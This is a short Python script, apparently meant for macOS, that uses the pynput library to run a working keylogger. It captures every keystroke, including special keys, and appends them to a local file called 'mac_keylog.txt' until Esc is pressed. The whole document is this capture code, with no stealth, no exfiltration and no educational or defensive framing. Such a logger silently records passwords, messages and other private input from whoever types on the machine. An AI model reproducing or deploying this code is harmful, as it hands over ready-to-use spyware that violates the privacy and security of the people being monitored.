from pynput import keyboard

# List to store pressed keys
keys = []

# Function called when a key is pressed
def on_press(key):
    try:
        # If the key is alphanumeric, add it to the log
        keys.append(key.char)
        write_to_file(key.char)
    except AttributeError:
        # For special keys, log them with a readable format
        special_key = f" {str(key)} "
        keys.append(special_key)
        write_to_file(special_key)

# Function to write the key to a log file
def write_to_file(key):
    with open("mac_keylog.txt", "a") as log_file:
        log_file.write(key)

# Function called when a key is released
def on_release(key):
    # Stop listener when 'Esc' is pressed
    if key == keyboard.Key.esc:
        return False

# Setting up the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

